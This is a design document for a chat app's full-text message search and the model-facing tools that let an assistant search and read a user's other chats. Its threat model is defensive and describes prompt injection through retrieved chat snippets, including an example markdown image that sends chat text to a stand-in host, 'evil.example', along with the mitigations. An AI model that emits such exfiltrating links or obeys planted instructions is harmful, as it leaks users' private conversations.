# Chat Content Search

## Status

Implemented. History search (the `/chats/history` page and the Cmd/Ctrl+K
search modal) matches both chat titles and message content in a single,
merged, always-on mode.

## Why Title-Only Search Existed Before

Message content is stored as rich `UIMessage['parts']` JSON (tool calls,
reasoning, file refs, plain text) in a single `messages.parts` blob column.
A `LIKE '%query%'` scan on this column would have no index, would match JSON
structure keys and non-text fields (false positives), and is semantically
unsound — users expect to search message text, not raw JSON.

## Architecture: A Standalone FTS5 Table, App-Level Dual-Write

This feature was originally scoped around an FTS5 **content table** pointing
at `messages` (`content='messages', content_rowid='rowid'`) kept in sync with
`AFTER INSERT/UPDATE/DELETE` triggers. That design was rejected in favor of a
**standalone, self-contained FTS5 table** written to at the application layer:

```sql
CREATE VIRTUAL TABLE message_search USING fts5(
  owner,
  body,
  body_stem,
  tokenize = 'unicode61 remove_diacritics 2'
);
```

- **`messages` is never altered.** No new column, no trigger, no schema
  coupling between the two tables.
- **`rowid` = `messages.id`** — a true SQLite rowid alias — so joins back to
  `messages`/`chats` are plain integer primary-key lookups.
- **`owner`** is an indexed (not `UNINDEXED`) tenancy tag of the form `u<userId>`,
  used for MATCH-side doclist pruning. It is derived only from the
  authenticated session's numeric user id, never from user-supplied text.
- **`body`** is the extracted, normalized message text (exact surface form).
- **`body_stem`** is the same text run through a Ukrainian stemmer, so
  declined/conjugated Ukrainian words can still match.
- **Every write is app-level and best-effort.** `server/utils/search/index-writer.ts`
  wraps every insert/delete in `try/catch`, logs via evlog, and never throws
  into a user request — the index write path can never break sending a
  message or deleting a chat.
- **Write call sites:** after a user message is persisted, after an assistant
  message is persisted, and after a branch's bulk-inserted messages are
  re-selected. **Delete call sites:** before a chat (or bulk of chats) is
  deleted, since the cascade would otherwise remove the `messages` rows this
  index resolves against.
- **An hourly sweeper** (`server/utils/search/sweeper.ts`, wired through
  `server/plugins/message-search-index-sweep.ts` on the existing `0 * * * *`
  cron already shared with `file-retention-cleanup`) runs two passes:
  a backfill pass (anti-join against messages that have **no** index row yet
  — new messages whose write failed, plus the initial historical backfill —
  cursor-based) and a garbage-collection pass (removes orphaned
  `message_search` rows whose `messages` row no longer exists — cascade
  deletes, failed delete hooks). The backfill anti-join only ever picks up
  never-indexed messages; it does **not** re-process rows that already have
  an index entry. A future stemmer change would need a deliberate one-time
  re-index of already-indexed `body_stem` values — that does not happen
  automatically. `messageSearchSweepBatchSize` only sizes the sweeper's
  read `LIMIT` and its in-memory per-user grouping — it is decoupled from
  D1's ~100-bound-param-per-statement ceiling, because every write against
  `message_search` is independently chunked at
  `SEARCH_INDEX_ROWS_PER_STATEMENT`/`SEARCH_DELETE_IDS_PER_STATEMENT`
  (`server/utils/search/index-writer.ts`) regardless of how large a batch
  the sweep read. Raising the sweep batch size cannot hit that limit.

Why standalone over content-table-with-triggers: triggers run in the same
transaction as the write and add an extra layer of DB-side logic to reason
about and to keep bug-free; a best-effort, always-non-throwing app-level write
plus an hourly reconciling sweeper gives the same eventual consistency
guarantee with far simpler failure semantics — a missed write or delete is
invisible to users and self-heals within the hour, instead of failing (or
silently corrupting) a user-facing request.

**"Self-heals" only covers a missing row, not a wrong one.** The backfill
anti-join (`where ms.rowid is null`) only ever looks at messages with no
`message_search` row at all. Once a row exists — even with an empty or wrong
`body` — it is permanently out of scope for every future sweep; there is no
automatic repair path for a bad write that still counts as "indexed". This
bit in production: `sweeper.ts` read `messages.parts` through a raw `sql`
tagged template (`db.all(sql\`select ... m.parts as parts ...\`)`), which
returns the driver's raw TEXT value instead of running it through Drizzle's
`mode: 'json'` decoder — decoding only happens through the schema-aware query
builder (`db.select().from(schema.messages)`), never for a raw column alias.
`extractMessageSearchText()`'s `Array.isArray` guard silently turned that raw
JSON string into an empty body, so the backfill inserted a real
`message_search` row for every historical message with **zero indexed
text** — `indexedCount` in the hourly log looked perfectly healthy the
entire time. New messages were unaffected because their write path already
holds the parsed `parts` in memory from the request. Fixed by parsing the
raw string defensively in the sweeper before extraction; recovering
already-broken rows in a deployed environment needs a one-time
`DELETE FROM message_search WHERE coalesce(length(body), 0) = 0` **after**
the fix ships, so the next sweep re-backfills them with real content. That
delete only gets re-picked up if the KV `search-index:sweep-cursor` is at (or
resets to) `0` — the anti-join is `m.id > cursor`, so a cursor left above a
deleted row's id would skip it until a later short pass wraps the cursor back
to `0`. The sweeper's own `hasMore`/cursor-reset logic (see above) means this
is already true once a full backfill pass has completed, but check the KV
value before relying on it in a partially-backfilled environment. Recovery
speed is bounded by `messageSearchSweepBatchSize` (200 by default) times one
sweep per hour — thousands of deleted rows take on that order of hours to
fully re-populate, not one cron tick.

The sweep result's `emptyBodyBackfilledCount` (logged as part of
`messageSearchSweepResult`) is **not** itself a failure signal — a
tool-only assistant turn or a file-only user message legitimately extracts to
an empty body, so this count is nonzero in every healthy sweep. What flagged
the incident above is the *ratio*: `emptyBodyBackfilledCount` was
approximately equal to `backfilledCount` (nearly every backfilled row was
empty), not merely greater than zero.

## Ukrainian Stemmer

`server/utils/search/ukrainian-stemmer.ts` is a vendored, de-minified
TypeScript port of `@orama/stemmers@3.1.18` (`dist/uk.js`), Apache License
2.0. Lineage: Drupal's `ukstemmer` → `ukrstemmer-node` → `@orama/stemmers`.
It is vendored rather than added as an npm dependency because this repo's
pnpm `minimumReleaseAge` gate would otherwise block adopting a freshly
released package version.

**Upstream bug found and fixed while vendoring:** the derivational-suffix
regex (`-ость` stripping) carried the `g` flag and was used with `.test()`,
which mutates `lastIndex` on a global regex and makes the result alternate
`true`/`false` on successive calls against the same string — a real defect,
verified directly (`/..(?<=о)сть?$/g.test('веселость')` → `true, false, true,
false, ...`). The `g` flag is removed in the vendored copy; this asymmetry
would otherwise have silently broken index/query symmetry for any word
matching that pattern.

### Honest, measured stemmer coverage

The stemmer bridges most common declension classes but has real, permanent
limits. These are accepted trade-offs, not bugs to "fix":

| # | Case | Words → stems | Bridged? |
|---|---|---|---|
| 1 | Velar mutation г→з | `книга`→`кни`, `книзі`→`кни`, `книгу`→`кни` | **Yes** |
| 2 | Velar mutation к→ц | `рука`→`рук`, `руці`→`руц` | **No** — the ≥3-char minimum-stem guard rejects `ру` |
| 3 | Plain declension | `школа`/`школи`/`школі`/`школу`/`школою` → all `школ` | **Yes** |
| 4 | Verb stem alternation | `писати`→`пис`, `пишу`→`пиш` | **No** |
| 5 | Prefix-prepended aspect | `писати`→`пис`, `написати`→`напи` | **No** — permanent structural limit (prefixes aren't stripped) |
| 6 | Prefix-prepended aspect | `робити`→`роб`, `зробити`→`зроб` | **No** — same permanent limit |

A `MIN_AGGRESSIVE_STEM_LENGTH = 3` guard rejects consonant-alternation results
shorter than 3 characters, which correctly blocks catastrophic over-stems
(`нога`→"но", `вода`→"во", `місто`→"мі" would all be far too short to be
useful match keys) at the cost of not bridging case #2 above. This is a
deliberate precision/recall trade-off, verified against a battery of common
nouns.

## Adding another language

Language routing today is **script-based, not language-based**.
`server/utils/search/tokens.ts` has `isCyrillicToken()`, which checks
whether at least half a token's letters are Cyrillic; tokens that pass are
run through `stemUkrainianWord()` from
`server/utils/search/ukrainian-stemmer.ts`. Every Latin-script token skips
stemming entirely and is indexed/queried as its raw surface form.

**Russian gets accidental, partial coverage.** A Cyrillic token is always
routed through the *Ukrainian* rule table, regardless of whether it's
actually Russian — "Cyrillic" is being used as a stand-in for "Ukrainian"
because the two scripts overlap almost completely. Some Russian
declensions happen to bridge through Ukrainian's suffix-stripping rules by
coincidence; many don't. Doing this properly would need two separate
things: a real Russian stemmer (Snowball has a proper one, so this would be
a vendoring job rather than a from-scratch port) and an actual
language-routing decision, since "is this token Cyrillic" and "is this
token Russian" are not the same question.

**Polish and other Latin-script inflected languages get nothing.** The
`isCyrillicToken()` guard routes every Latin-script token straight past
stemming, Polish included. Adding a language like Polish therefore needs
two things, and the second is the harder one: (a) a vendored stemmer for
that language, and (b) a language-detection heuristic for Latin-script
tokens — no such heuristic exists yet, and "is this Latin-script word
Polish, English, French, or a code identifier" is a materially harder
problem than the Cyrillic/Latin script check this codebase currently gets
away with.

**Steps to add a language**, once the above is decided:

1. Vendor a stemmer for it under `server/utils/search/` (see the Ukrainian
   stemmer above for the vendoring pattern this repo follows — check
   license terms and de-minify/port to TypeScript).
2. Extend the routing logic in `tokens.ts` (`isCyrillicToken()`,
   `stemSearchToken()`, and — for a Latin-script language — the
   language-detection heuristic that doesn't exist yet) to call the new
   stemmer for the right tokens.
3. Run a backfill so already-indexed rows pick up the new stemming.

**That backfill must be a deliberate, one-time reindex — it will not
happen on its own.** The hourly sweeper's backfill pass
(`server/utils/search/sweeper.ts`) is a strict anti-join against messages
that have **no** `message_search` row yet. It only ever picks up
never-indexed messages (new messages whose write failed, or the initial
historical backfill). It will not re-stem, re-write, or otherwise touch a
`message_search` row that already exists — so changing or adding a
stemmer without a manual reindex leaves every already-indexed message's
`body_stem` computed with the *old* stemming rules indefinitely. (This
exact false claim — that the sweeper would pick up a stemmer change for
free — was already made and corrected once in this document; it is
recorded here deliberately so it doesn't get reintroduced.)

## Text Extraction and Normalization

`server/utils/search/text.ts` extracts only `type === 'text'` parts from a
message's `UIMessage['parts']` array (tool calls, reasoning, file refs, and
step-start parts are excluded on purpose), joins them, and normalizes:
NFC-normalizes, canonicalizes every apostrophe variant (`'`, `’`, `` ` ``,
`´`) to U+02BC (`ʼ`), and collapses whitespace. The same normalization runs
at index-write time and at query time.

The apostrophe canonicalization matters because SQLite's `unicode61`
tokenizer treats U+02BC as a token character but ASCII `'` as a separator —
`зʼїзд` stays one token while `п'ять` would otherwise split into `п` + `ять`.
Canonicalizing to U+02BC keeps Ukrainian words whole regardless of which
apostrophe a user actually typed. The accepted consequence: stored `body`
text (and therefore displayed snippets) show `ʼ`, not the original apostrophe
character.

## Query Building and Ranking

`server/utils/search/query.ts` builds the FTS5 MATCH expression from
sanitized, tokenized, capped user input (max 8 tokens, 128 characters).
Every token becomes a doubled-quote-escaped prefix phrase, OR'd across
`body` and `body_stem`, ANDed together under an owner-tag filter — so no
user-controlled string is ever concatenated into SQL outside an escaped
quoted phrase.

Candidate rows are ranked with `bm25(message_search, 0.0, 1.0, 0.4)`:
`owner` contributes nothing to relevance (it's a tenancy tag), an exact
surface-form (`body`) hit gets full weight, and a stem-only (`body_stem`)
hit is demoted so exact-form hits always outrank stem-only ones. **SQLite's
`bm25()` returns negative values where more negative is a better match** —
results are ordered `score ASC`.

**Triple tenancy check, not redundant by accident:**
1. `{owner}: uN` inside the MATCH expression — lets FTS5 intersect doclists
   for performance, built only from the session's integer `userId`.
2. `ms.owner = ?` — a bound-parameter equality filter, immune to any
   sanitizer defect.
3. `c.user_id = ?` via the join to `chats` — the database's own authoritative
   check, independent of anything stored in the FTS5 table.

## Merged Search UX — Single Box, Single Mode, No Switcher

Both the history page and the Cmd/Ctrl+K search modal expose **one search
box and one search mode**. Typing a query returns title matches first, then
message-content matches with snippets, merged into one ranked list. There is
**no "Titles / Messages / All" segmented switcher**, and **no "no results —
search message content too?" fallback prompt**.

This was a deliberate decision, not an oversight:

- **No upfront scope switcher.** NN/g's usability research documents scope
  switchers placed in front of a search box as a well-established
  antipattern — most users don't understand what scope they're in, don't
  notice the switcher, or forget to change it back, silently narrowing every
  subsequent search.
- **No title-first-with-fallback prompt.** A "search titles first, offer to
  expand to message content on zero results" pattern exists specifically to
  protect an *expensive* search from running by default. That constraint
  doesn't apply here: the FTS5 leg is a fast indexed lookup that already runs
  on every search unconditionally. Gating it behind a second user action
  would only add a click with no matching cost justification.

A chat that matches only by message content still surfaces its `pinnedAt` if
it happens to be pinned (rendered as an in-place pin badge), but the pinned
list itself (rendered separately, above the merged results) stays
title-`LIKE`-only — pin status does not gate or reorder content matches.

Server-side, an unused `searchIn=all|title|content` query parameter exists on
`GET /api/v1/chats/history` purely as an API affordance (`all` is always the
default and the only value the frontend ever sends). There is intentionally
no UI control for it.

## Recent Chats in the Cmd/Ctrl+K Modal

When the modal opens with an empty query, it fetches
`/api/v1/chats/history?limit=3` once, then computes the true global top 3
by merging `pinned` (all pinned chats) and `chats` (top non-pinned by
`activityAt`) and sorting by `activityAt` descending — this union is
provably guaranteed to contain the global top 3 by construction. These
render as a "Recent" command group placed above the default action list, so
keyboard navigation flows naturally starting from it.

**Ordering is strictly by `activityAt`. A pinned chat that lands in the top 3
is NOT hoisted to first position** — it renders in its natural recency slot
with a small pin badge shown in place. This is a deliberate product decision
for a throwaway quick-switcher preview (as opposed to a persistent sidebar
list, where pin-to-top is a more established convention) — not a bug to fix.

## Model-facing tools: `search_chats` and `read_chat`

Workstream W2 of `docs/memory-architecture.md` (section 3.3) lets the model
search and read the user's **other** chats, so "what do you know about me" and
"what did we decide in that other chat" work across chats. It reuses the
`message_search` table above: no schema change, no new index.

Code lives in `server/utils/memory/tools/`:

| File | Role |
|---|---|
| `constants.ts` | Every cap, the tool names, the `<chat_excerpt>` tags and the untrusted-data notice |
| `enabled.ts` | `isChatSearchToolEnabled(settings)` and `isMemoryToolsEnabled(settings)`, the gates (read `chatSearchEnabled` / `memoryEnabled` since W4) |
| `chat-search-budget.ts` | Per-request call budget, shared by both tools |
| `search-chats.ts` | The FTS query, AND to OR fallback, best hit per chat |
| `read-chat.ts` | Ownership-checked, bounded read window |
| `excerpt.ts` | Neutralising and wrapping of every string that reaches the model |
| `index.ts` | `getChatSearchTools()`, the AI SDK tool definitions |

### Contracts

`search_chats({ query, limit? })` returns
`{ notice, results: [{ chatId, title, url, messageId, role, date, snippet }] }`:
at most 8 chats (default 5), the best-ranked message per chat, current chat
excluded. `chatId` is the chat `slug` (ULID), `url` is `/chats/<slug>`,
`messageId` is the message `publicId` (never the integer rowid). The output
field is deliberately named `results` and carries no `provider` field: the
continuation flattener and the chip render `results[]`, while
`emitSourcesForExternalSearchResults` mirrors outputs into web-source
citations **only** when `provider` is `brave`, `exa` or `deepseek`.

`read_chat({ chatId, aroundMessageId? })` returns
`{ notice, chat, messages, truncated, nextAroundMessageId? }`: text parts only
(tool, reasoning, file and persisted failure-notice parts are skipped),
whitespace preserved so code blocks survive, at most `READ_CHAT_MAX_CHARS`
(8000, about 3k Cyrillic tokens; Ukrainian costs roughly 2 to 3 characters
per token) in total and `READ_CHAT_MESSAGE_MAX_CHARS` (3000) per message,
centred on `aroundMessageId` or starting at the chat start. When more of the
chat follows, `nextAroundMessageId` is `from:<publicId>` of the first message
after the window; passing it back as `aroundMessageId` starts the next window
at that message and grows only forward, so consecutive calls never repeat a
message. (A cursor that merely pointed at the last returned message stalled
on long messages: the window grew backwards first and returned the same
text.) The `from:` prefix is the stateless way to tell a continuation from a
search-hit `messageId`; real ids contain no colon. Legacy rows without a
`public_id` are skipped when picking the cursor.

### Query fallback

LLM-written queries are sentences, so the strict prefix-AND of the history
search often finds nothing. `search_chats` runs the AND expression first and,
only when that returns no row, the same tokens as an OR expression, ranked by
the same `bm25(message_search, 0.0, 1.0, 0.4)`. **The OR expression must be
`{owner}: uN AND (c1 OR c2 ...)`.** FTS5 binds `AND` tighter than `OR`, so
without the parentheses `{owner}: u1 AND a OR b` parses as
`(owner AND a) OR b` and returns other tenants' rows; this was reproduced
against a real FTS5 table and is pinned by tests. In OR mode tokens shorter
than two characters are dropped (one-character prefixes match the whole
index); two-character tokens such as `AI`, `DB`, `R2` stay.

The doc's "drop the rarest-missing tokens" middle step is **not** implemented:
AND to OR only. OR with bm25 already ranks documents that match more tokens
first, and the middle step needs per-token document frequencies that FTS5
does not expose cheaply.

All LLM text goes through the same normalise, tokenise and escape path as
user text (`buildSearchMatchExpression`). The tokenizer splits on everything
except letters, digits and U+02BC, so `"`, `\`, parentheses, `*`, `^`, `:`
and braces can never reach the MATCH string, and `AND`/`OR`/`NOT`/`NEAR`
become lowercase quoted prefix phrases. The tenancy check is the same triple
described above (owner in MATCH, bound `ms.owner = ?`, bound `c.user_id = ?`).

### Scope: current chat and projects

The current chat is excluded inside the query (`m.chat_id != ?`). An optional
`projectId` restricts to `c.project_id = ?`, **inside the same FTS query,
before the 200-candidate `LIMIT`**. A post-filter would give a small project
zero hits whenever other chats fill the candidate list; the unit test creates
more than 200 stronger matches outside the project to prove it. Both tools
accept `projectId`, and `read_chat` answers 404 for a chat outside it.
Project isolation is not a setting yet, so the route passes no `projectId`
and the production scope is all of the user's chats (also from inside a
project chat). There is no incognito flag in the schema either, so nothing
filters incognito chats yet. Both belong to the settings workstream.

### Registration, budget and the tool loop

The tools are registered server-side in `chats/[slug]/index.post.ts` after
the Brave/Exa block, never added to the client `chatToolSchema` enum (so they
do not inherit "web search and image generation cannot combine"). A send gets
them only when **all** hold:

- `isChatSearchToolEnabled(settings)` (the user's `chatSearchEnabled`, default on; since W4 the settings row is read per send and fails closed);
- no forced `toolChoice` on `parsedTools`: image generation and Google
  native `web_search` force one, and a forced choice plus the follow-up
  marker would re-select the same tool forever (see the `withFollowUpTurn`
  JSDoc). This is a deliberate deviation from "coexist with everything":
  those two sends never get chat search;
- the send is not an image generation send (gateway image generation sets no
  `toolChoice`);
- the model supports tool calling: `Model.toolCall === true` for direct
  providers, `gatewayToolCall === true` (strict, fail-closed) for gateways.

**Budget.** `createChatSearchBudget()` allows 3 calls per request, shared by
`search_chats` and `read_chat`, consumed synchronously at the top of each
`execute` (parallel calls in one step cannot exceed it). A spent budget throws
a 429 `createError`, which the SDK turns into a `tool-error` part, not a
stream failure, exactly like `search-budget.ts` for Brave/Exa. The two
budgets are independent: chat calls are never counted as billable web
searches (that accounting is name-based).

**Loop cap.** Both tools carry `withFollowUpTurn()`, so a send that registers
them runs the multi-step loop. `resolveToolLoop(tools, { chatSearchSteps })`
computes the cap as `toolSteps + 1`, where `toolSteps` is
`TOOL_LOOP_MAX_TOOL_STEPS` (3) if any non-chat follow-up tool is registered,
plus 3 if chat tools are registered. Web only is 4 (unchanged), web plus chat
is 7, chat only is 4. The forced answer step is `cap - 1`, and the route reads
the same value for `forcedStepIndex`, so the forced answer step and the
search-answer continuation guarantee keep working with the raised cap. A
consequence worth knowing: **every send on a tool-calling model is now a loop
send** (`stopWhen`, `prepareStep`, and the 540 s total timeout from
`TOOL_LOOP_TOTAL_TIMEOUT_MS`), even with no tool requested, and
Cloudflare-gateway plus Brave sends can run up to 7 steps. The two existing
integration specs whose mocked model has `toolCall: true`
(`chats-gateway`, `chats-cloudflare-search-answer`) mock the gate off to keep
their original assertions; `chats-chat-search-tools.spec.ts` covers the
registered path.

**Instruction.** One constant line (`CHAT_SEARCH_INSTRUCTION`) sits right
after the project system prompt in `buildChatInstructions`, before anything
that carries the daily date, so it stays in the stable cached prefix
(`docs/providers/anthropic.md` lists the invalidators). It is emitted only
when the tools were registered and is omitted from the tool-less
continuation. Adding the tools to a model that had none changes its tool set
once, which invalidates the Anthropic cache one time.

### Memory tools next to the chat tools (W4)

The four memory tools (`memory_list`, `memory_read`, `memory_write`,
`memory_forget`, `tools/memory-tools.ts`) are registered by the same block of
`chats/[slug]/index.post.ts`, behind `isMemoryToolsEnabled(settings)` (the
user's `memoryEnabled`) and the same tool-calling and forced-`toolChoice`
conditions. They spend the **same** `ChatSearchBudget`: three calls per
message across all six tools, and `resolveToolLoop` counts a memory tool like a
chat tool (`isMemoryToolName`, deliberately outside `CHAT_SEARCH_TOOL_NAMES`
so the continuation does not render them as chat history). Contracts, the
code-enforced `userRequestQuote` gate for the two write tools, the shared-scope
rules, the chip and its Undo are in `docs/memory-architecture.md` section 3.11.

### Logging

The Axiom dataset is at its 256-field cap (`docs/axiom-map-fields.md`), so
the tools log only under `attributes.chatSearch.*`: `operator` and `hits` for
a search, `messages` and `truncated` for a read, `error` on a failed query,
and `registered` plus `usedCalls` on the `ai-stream` event. No query text or
chat content is ever logged.

### UI and persistence

The tool parts render as a compact search-step chip ("Searched your chats",
"Read a chat") with in-app links; only `/chats/<alphanumeric slug>` paths
become links, everything else is dropped. The parts persist in
`messages.parts` like Brave/Exa parts (no `messages.tools` change: that
column holds the client-requested tools). `sanitizeMessagesForModelContext`
is a whitelist, so past `tool-search_chats`/`tool-read_chat` parts never reach
a later model context (pinned by a test). Public shares and branches strip
tool parts as well.

### Threat model

- **Cross-user leakage.** Every query is bound to the session's user three
  ways (above); `read_chat` looks the chat up by `slug` **and** `userId`, a
  missing chat, another user's chat and another project's chat produce the
  identical 404 (no existence oracle), and `aroundMessageId` only resolves
  inside the verified chat. Model-supplied ids are never hashid-decoded.
- **FTS MATCH injection.** None found; verified by running about 28 hostile
  inputs against a real FTS5 table in both operators.
- **Prompt injection through snippets.** Everything the model gets back is
  quoted history: every `<`/`>` (ASCII and look-alike brackets) is replaced,
  strings are wrapped in `<chat_excerpt>`, the output carries a `notice`, the
  tool descriptions say the content is data and never instructions, and the
  continuation keeps results inside `<untrusted_web_search_results>`. The
  delimiter is a fixed tag, not a per-request nonce: a past chat can contain
  text that merely looks like a boundary, so treat this as a mitigation, not
  a guarantee. A chat the user branched from a shared chat contains
  third-party-authored text indexed as the user's own. The tool-less
  continuation renders chat results under their own `Chat search N` /
  `Chat read N` headings with the notice and the full `read_chat` window,
  inside the same untrusted tag.
- **Exfiltration through rendered markdown.** This is the real risk of
  giving the model the whole history. Before W2 a poisoned turn could leak
  only the current chat; now it can pull other chats into context and emit
  `![](https://evil.example/?d=<text>)`, which the browser would fetch the
  moment it renders (and again on every reopen). The fix is at the render
  layer: `app/components/prose/Img.vue` is registered as `img` for chat
  messages, shared chats, reasoning text and project memory. It renders only
  same-origin images (and raster `data:image/*`); every other `src` becomes a
  blocked-image placeholder that shows the hostname only, never the URL, and
  opens the link through the existing external-link confirmation. It ignores
  `allowExternalLinks` on purpose. A same-origin GET to a route with side
  effects would still fire, so GET routes must stay side-effect free. The
  other leak channel (the model putting excerpts into a Brave/Exa query) is
  bounded by the 3-call budgets and uses the user's own search key.
- **Data crossing providers.** The tools send up to about 8k characters of an
  old chat to whichever provider or gateway the *current* chat uses. They are
  on by default; since W4 the user's `chatSearchEnabled` setting turns
  them off (`docs/memory-architecture.md` 3.11), and a failed settings read
  turns them off for that send.
- **Persisted copies.** Tool outputs, including excerpts of other chats, are
  stored in the current chat's `messages.parts`. Deleting chat A does not
  erase excerpts of it that were stored while chatting in chat B. This is a
  retention point for the data-rights workstream (W8).
- **Cost.** Each call is two indexed queries at most (AND, then OR) with a
  200-row candidate cap, bounded output, and no D1 write. The tool
  definitions add roughly 400 tokens to every request on a tool-calling
  model.

## Operational Risks

**`wrangler d1 export` is incompatible with a database containing an FTS5
virtual table** (tracked upstream at `cloudflare/developer-platform#11`,
still open at the time this was written). **Never run `wrangler d1 export`
against a database that has `message_search`.** D1 Time Travel is the backup
and recovery mechanism for this database going forward.

**CI auto-applies D1 migrations on production deploy with no manual gate.**
Merging changes that include a migration means that migration hits
production D1 on the very next deploy. The two migrations this feature
introduced (`idx_messages_chat_id` and the `message_search` virtual table)
are both additive and neither touches `messages` or `chats` directly, but
this auto-apply behavior is a standing risk worth knowing about for any
future migration in this repo.
